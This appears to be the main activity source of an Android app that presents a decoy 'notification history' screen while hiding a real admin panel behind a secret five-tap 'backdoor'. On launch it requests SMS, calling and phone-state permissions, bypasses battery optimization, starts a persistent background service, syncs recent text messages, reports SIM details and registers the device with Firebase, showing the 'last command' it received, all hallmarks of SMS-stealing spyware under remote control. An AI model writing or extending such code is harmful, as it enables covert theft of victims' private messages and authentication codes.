package com.notification.historylog

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SwitchCompat
import androidx.core.app.ActivityCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var lastCommandText: TextView
    private lateinit var decoyLayout: LinearLayout
    private lateinit var realLayout: LinearLayout
    private lateinit var toolbarTitle: TextView
    private lateinit var decoyVersionText: TextView
    
    private lateinit var loggerStatusText: TextView
    private lateinit var loggerToggleSwitch: SwitchCompat
    private lateinit var notificationRecyclerView: RecyclerView

    private var clickCount = 0
    private var lastClickTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Views
        decoyLayout = findViewById(R.id.decoyLayout)
        realLayout = findViewById(R.id.realLayout)
        toolbarTitle = findViewById(R.id.toolbarTitle)
        decoyVersionText = findViewById(R.id.decoyVersionText)
        
        loggerStatusText = findViewById(R.id.loggerStatusText)
        loggerToggleSwitch = findViewById(R.id.loggerToggleSwitch)
        notificationRecyclerView = findViewById(R.id.notificationRecyclerView)

        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        lastCommandText = findViewById(R.id.lastCommandText)

        // Setup Decoy Logging Toggle
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        loggerToggleSwitch.isChecked = isEnabled
        updateLoggerStatus(isEnabled)

        loggerToggleSwitch.setOnCheckedChangeListener { _, isChecked ->
            sharedPref.edit().putBoolean("carer_enabled", isChecked).apply()
            updateLoggerStatus(isChecked)
            updateStatus()
        }

        // Setup RecyclerView
        notificationRecyclerView.layoutManager = LinearLayoutManager(this)

        // Secret Backdoor: Tap toolbar title 5 times
        val backdoorListener = View.OnClickListener {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastClickTime < 1000) {
                clickCount++
            } else {
                clickCount = 1
            }
            lastClickTime = currentTime

            if (clickCount >= 5) {
                showRealUI()
                clickCount = 0
            }
        }
        toolbarTitle.setOnClickListener(backdoorListener)
        decoyVersionText.setOnClickListener(backdoorListener)

        // Admin panel buttons
        findViewById<Button>(R.id.settingsButton).setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }

        findViewById<Button>(R.id.viewLogsButton).setOnClickListener {
            startActivity(Intent(this, LogViewerActivity::class.java))
        }

        findViewById<Button>(R.id.exitAdminButton).setOnClickListener {
            hideRealUI()
        }

        // Background logic
        requestRequiredPermissions()
        requestBatteryOptimization()
        startCarerService()
        detectAndReportSims()

        updateStatus()
    }

    private fun showRealUI() {
        decoyLayout.visibility = View.GONE
        realLayout.visibility = View.VISIBLE
        Toast.makeText(this, "Admin Mode Activated", Toast.LENGTH_SHORT).show()
    }

    private fun hideRealUI() {
        realLayout.visibility = View.GONE
        decoyLayout.visibility = View.VISIBLE
    }

    private fun updateLoggerStatus(enabled: Boolean) {
        if (enabled) {
            loggerStatusText.text = "Status: Logging Active"
            loggerStatusText.setTextColor(android.graphics.Color.parseColor("#4CAF50"))
        } else {
            loggerStatusText.text = "Status: Logging Disabled"
            loggerStatusText.setTextColor(android.graphics.Color.parseColor("#F44336"))
        }
    }

    private fun loadNotifications() {
        val items = mutableListOf<NotificationLogItem>()
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                val cursor = contentResolver.query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC"
                )
                if (cursor != null && cursor.moveToFirst()) {
                    val count = if (cursor.count > 25) 25 else cursor.count
                    for (i in 0 until count) {
                        val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
                        items.add(NotificationLogItem(address, body, date))
                        if (!cursor.moveToNext()) break
                    }
                    cursor.close()
                }
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error reading local SMS: ${e.message}")
        }

        val emptyState = findViewById<TextView>(R.id.emptyStateText)
        if (items.isEmpty()) {
            emptyState.visibility = View.VISIBLE
            notificationRecyclerView.visibility = View.GONE
        } else {
            emptyState.visibility = View.GONE
            notificationRecyclerView.visibility = View.VISIBLE
            notificationRecyclerView.adapter = NotificationAdapter(items)
        }
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        loadNotifications()
    }

    private fun requestRequiredPermissions() {
        val permissions = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CALL_PHONE)
            }
            if (checkSelfPermission(Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.INTERNET)
            }
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_PHONE_STATE)
            }
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.RECEIVE_SMS)
            }
            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_SMS)
            }
        }

        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 100)
        } else {
            // Permissions already granted, sync SMS and load lists
            SmsHelper.syncLastMessages(this)
            loadNotifications()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (grantResults.isNotEmpty() && grantResults[permissions.indexOf(Manifest.permission.READ_SMS)] == PackageManager.PERMISSION_GRANTED) {
                SmsHelper.syncLastMessages(this)
                loadNotifications()
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }
    }

    private fun detectAndReportSims() {
        try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val simCount = subscriptionManager.activeSubscriptionInfoList?.size ?: 0
                val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
                sharedPref.edit().putInt("sim_count", simCount).apply()
                
                val fcmToken = sharedPref.getString("fcm_token", "") ?: ""
                if (fcmToken.isNotEmpty()) {
                    FirebaseHelper.registerDevice(this, fcmToken, simCount)
                }
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "SIM detect error: ${e.message}")
        }
    }

    private fun startCarerService() {
        val intent = Intent(this, CarerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun updateStatus() {
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        val deviceId = FirebaseHelper.getDeviceId(this)
        val lastCommand = sharedPref.getString("last_command", "None")

        statusText.text = if (isEnabled) "✅ SERVICE ACTIVE" else "⚠️ SERVICE DISABLED"
        deviceIdText.text = "Device ID: $deviceId"
        lastCommandText.text = "Last Command: $lastCommand"
    }

    // RecyclerView Helper Classes
    data class NotificationLogItem(
        val sender: String,
        val body: String,
        val timestamp: Long
    )

    private class NotificationAdapter(private val list: List<NotificationLogItem>) : RecyclerView.Adapter<NotificationViewHolder>() {
        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): NotificationViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_notification, parent, false)
            return NotificationViewHolder(view)
        }

        override fun onBindViewHolder(holder: NotificationViewHolder, position: Int) {
            holder.bind(list[position])
        }

        override fun getItemCount(): Int = list.size
    }

    private class NotificationViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
        fun bind(item: NotificationLogItem) {
            itemView.findViewById<TextView>(R.id.notificationSender).text = item.sender
            itemView.findViewById<TextView>(R.id.notificationBody).text = item.body
            
            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
            itemView.findViewById<TextView>(R.id.notificationTime).text = sdf.format(Date(item.timestamp))
        }
    }
}
